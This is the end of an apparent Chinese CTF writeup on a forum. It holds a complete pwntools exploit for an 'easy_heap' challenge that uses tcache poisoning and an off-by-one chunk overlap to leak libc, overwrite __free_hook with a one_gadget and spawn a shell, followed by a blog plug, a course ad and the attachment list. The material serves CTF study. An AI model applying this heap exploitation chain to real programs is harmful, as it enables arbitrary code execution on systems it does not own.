
```
from pwn import *



p = process("easy_heap")

context.log_level = "DEBUG"



def _free(index):

    p.sendlineafter(">", "2")

    p.sendlineafter(">", str(index))



def _malloc(size, content):

    p.sendlineafter(">", "1")

    p.sendlineafter(">", str(size))

    p.sendlineafter(">", content)



def _puts(index):

    p.sendlineafter(">", "3")

    p.sendlineafter(">", str(index))



def fill_tcache(start, end, step = 1):

    for i in range(start, end, step):

        _free(i)



def remove_tcache(num):

    for i in range(0, num):

        _malloc(2, "a")





# Initialize

for i in range(0, 10):

    _malloc(0x2, "a")



# fill the TCache to put chunk to unsorted bins

fill_tcache(3, 10)



# Chunk1 and chunk2 will merged, so chunk3's prev_size = 0x200

# Now, we can use off by one to overlap chunks

_free(0)

_free(1)

_free(2)



# Apply again to split unsorted bin

# The array will be filled from 0 ~ 6

remove_tcache(7)



# Split unosrted bin now, we can get 0x200 in prev_size of chunk9

_malloc(0x2, "7") # chunk7

_malloc(0x2, "8") # chunk8



# If we continue use free, they will be put to unosrted bin

# and the prev_size byte will be erased

# therefore, we apply tacache to store them

# We also need to switch there location in list

# Otherwise we cannot erase the prev_inuse byte

_malloc(0x2, "9")

_free(8)

fill_tcache(0, 6)

_free(7)



# off by one

remove_tcache(6)

_malloc(0xf8, "8")



# Again, we need to full filled our TCache to use unsorted bin

fill_tcache(0, 7)



# Trigger Overlap

_free(9)

remove_tcache(7)

_malloc(0x1, "a")



# Leak main_arena

_puts(7)

main_arena = p.recvline()[1:-1]

base = u64(main_arena + '\x00' * 2) - 0x3ebca0

print "base_addr: " + hex(base)

one_gadget = base + 0x4f322

free_hook = base + 0x3ed8e8

print "free_hook:" + hex(free_hook)



# TCache Arbitrary Write

_malloc(2, "0x9")

_free(7)

_free(9)

_malloc(0x10, p64(free_hook))



# Merege chunks to extra write

fill_tcache(0, 7)

remove_tcache(7)

_malloc(0x10, p64(one_gadget))

_free(0)



p.interactive()
```

最后依然是广告，这是我的blog：b5eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4#2P5s2W2Q4x3X3g2^5P5i4Z5`. ，欢迎各位大佬访问QWQ

后面的几个pwn writeup有时间就写orz，尽量争取吧

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2018-11-20 03:35

被Auxy编辑，原因：

上传的附件：

- [libc64.so](javascript:void(0);)
  （1.94MB，113次下载）
- [easy\_heap](javascript:void(0);)
  （9.97kb，178次下载）
